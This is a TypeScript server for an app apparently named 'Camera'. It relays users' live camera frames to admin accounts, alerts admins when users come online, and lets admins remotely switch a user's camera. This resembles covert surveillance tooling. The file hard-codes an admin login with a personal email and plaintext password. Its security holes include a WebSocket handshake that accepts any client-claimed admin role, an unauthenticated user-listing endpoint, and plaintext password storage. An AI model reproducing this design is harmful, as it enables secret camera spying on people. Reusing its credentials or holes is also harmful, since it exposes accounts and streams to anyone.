import express from 'express';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);
const wss = new WebSocketServer({ server });

app.use(express.json({ limit: '10mb' }));

// In-memory User Database with pre-configured Admin
interface User {
  id: string;
  email: string;
  name: string;
  password: string;
  role: 'admin' | 'user';
  createdAt: string;
}

const users: Map<string, User> = new Map();

// Initialize Admin Account
const ADMIN_EMAIL = 'danlamimathias2025@gmail.com';
const adminUser: User = {
  id: 'admin-1',
  email: ADMIN_EMAIL,
  name: 'mathias danlami',
  password: 'Coded25.',
  role: 'admin',
  createdAt: new Date().toISOString()
};
users.set(adminUser.id, adminUser);

// Track Connected WebSockets
interface ConnectedClient {
  ws: WebSocket;
  userId: string;
  name: string;
  email: string;
  role: 'admin' | 'user';
  facingMode: 'user' | 'environment';
  isStreaming: boolean;
  connectedAt: string;
}

const connectedClients: Map<WebSocket, ConnectedClient> = new Map();

// Helper to broadcast presence list to everyone
function broadcastPresence() {
  const onlineUsersList = Array.from(connectedClients.values()).map(c => ({
    userId: c.userId,
    name: c.name,
    email: c.email,
    role: c.role,
    facingMode: c.facingMode,
    isStreaming: c.isStreaming,
    connectedAt: c.connectedAt
  }));

  const payload = JSON.stringify({
    type: 'presence:list',
    users: onlineUsersList
  });

  for (const client of connectedClients.keys()) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(payload);
    }
  }
}

// Broadcast notifications (online/offline events) to admins
function notifyAdmins(eventPayload: object) {
  const payloadStr = JSON.stringify(eventPayload);
  for (const [ws, client] of connectedClients.entries()) {
    if (client.role === 'admin' && ws.readyState === WebSocket.OPEN) {
      ws.send(payloadStr);
    }
  }
}

// WebSocket Connection Logic
wss.on('connection', (ws) => {
  let clientInfo: ConnectedClient | null = null;

  ws.on('message', (messageRaw) => {
    try {
      const data = JSON.parse(messageRaw.toString());

      if (data.type === 'auth') {
        const { userId, name, email, role } = data;
        clientInfo = {
          ws,
          userId,
          name,
          email,
          role: role === 'admin' ? 'admin' : 'user',
          facingMode: 'user',
          isStreaming: false,
          connectedAt: new Date().toISOString()
        };
        connectedClients.set(ws, clientInfo);

        // Send confirmation
        ws.send(JSON.stringify({
          type: 'auth:success',
          client: {
            userId,
            name,
            email,
            role: clientInfo.role
          }
        }));

        // Broadcast updated presence list
        broadcastPresence();

        // Send notification to admins about online user
        if (clientInfo.role !== 'admin') {
          notifyAdmins({
            type: 'user:online',
            user: {
              userId: clientInfo.userId,
              name: clientInfo.name,
              email: clientInfo.email,
              timestamp: new Date().toISOString()
            }
          });
        }
      }

      if (!clientInfo) return;

      if (data.type === 'stream:status') {
        clientInfo.isStreaming = Boolean(data.isStreaming);
        if (data.facingMode) {
          clientInfo.facingMode = data.facingMode;
        }
        broadcastPresence();
      }

      if (data.type === 'stream:frame') {
        // Forward video frame to admins or designated admin viewers
        const { frameData, facingMode } = data;
        clientInfo.isStreaming = true;
        if (facingMode) clientInfo.facingMode = facingMode;

        const framePayload = JSON.stringify({
          type: 'stream:frame',
          userId: clientInfo.userId,
          name: clientInfo.name,
          email: clientInfo.email,
          facingMode: clientInfo.facingMode,
          frameData,
          timestamp: new Date().toISOString()
        });

        // Broadcast frame to all connected admins
        for (const [otherWs, otherClient] of connectedClients.entries()) {
          if (otherClient.role === 'admin' && otherWs.readyState === WebSocket.OPEN) {
            otherWs.send(framePayload);
          }
        }
      }

      if (data.type === 'admin:request_camera_switch') {
        if (clientInfo.role !== 'admin') return;
        const { targetUserId, facingMode } = data;

        // Find targeted user connection
        for (const [targetWs, targetClient] of connectedClients.entries()) {
          if (targetClient.userId === targetUserId && targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify({
              type: 'camera:switch_command',
              facingMode
            }));
          }
        }
      }

      // WebRTC Signaling Relays
      if (data.type === 'webrtc:offer' || data.type === 'webrtc:answer' || data.type === 'webrtc:ice-candidate') {
        const { targetUserId } = data;
        for (const [targetWs, targetClient] of connectedClients.entries()) {
          if (targetClient.userId === targetUserId && targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify({
              ...data,
              senderId: clientInfo.userId,
              senderName: clientInfo.name
            }));
          }
        }
      }

    } catch (err) {
      console.error('WebSocket message parsing error:', err);
    }
  });

  ws.on('close', () => {
    if (clientInfo) {
      connectedClients.delete(ws);
      broadcastPresence();

      if (clientInfo.role !== 'admin') {
        notifyAdmins({
          type: 'user:offline',
          user: {
            userId: clientInfo.userId,
            name: clientInfo.name,
            email: clientInfo.email,
            timestamp: new Date().toISOString()
          }
        });
      }
    }
  });
});

// REST API Routes
app.post('/api/auth/register', (req, res) => {
  const { name, email, password } = req.body;

  if (!name || !email || !password) {
    return res.status(400).json({ error: 'Name, email, and password are required' });
  }

  const normalizedEmail = email.trim().toLowerCase();

  // Check if user exists
  for (const user of users.values()) {
    if (user.email.toLowerCase() === normalizedEmail) {
      return res.status(400).json({ error: 'An account with this email already exists' });
    }
  }

  const role = normalizedEmail === ADMIN_EMAIL.toLowerCase() ? 'admin' : 'user';
  const newUser: User = {
    id: 'user-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7),
    email: normalizedEmail,
    name: name.trim(),
    password,
    role,
    createdAt: new Date().toISOString()
  };

  users.set(newUser.id, newUser);

  const { password: _, ...userWithoutPassword } = newUser;
  return res.json({ user: userWithoutPassword });
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const normalizedEmail = email.trim().toLowerCase();

  let foundUser: User | null = null;
  for (const user of users.values()) {
    if (user.email.toLowerCase() === normalizedEmail) {
      foundUser = user;
      break;
    }
  }

  if (!foundUser || foundUser.password !== password) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  const { password: _, ...userWithoutPassword } = foundUser;
  return res.json({ user: userWithoutPassword });
});

app.get('/api/users', (req, res) => {
  const userList = Array.from(users.values()).map(({ password, ...u }) => u);
  res.json({ users: userList });
});

// Vite Integration for Dev Mode & Static Serve for Prod
const PORT = process.env.PORT || 3000;

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'custom'
    });
    app.use(vite.middlewares);
    app.use('*', async (req, res, next) => {
      const url = req.originalUrl;
      try {
        let template = await vite.transformIndexHtml(url, `<!doctype html>
<html lang="en">
  <head>
    <meta name="theme-color" content="#000000" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="apple-mobile-web-app-title" content="Camera" />
    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" href="/favicon.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
    <title>Camera</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>`);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });
  } else {
    app.use(express.static(path.join(__dirname, 'dist')));
    app.get('*', (req, res) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
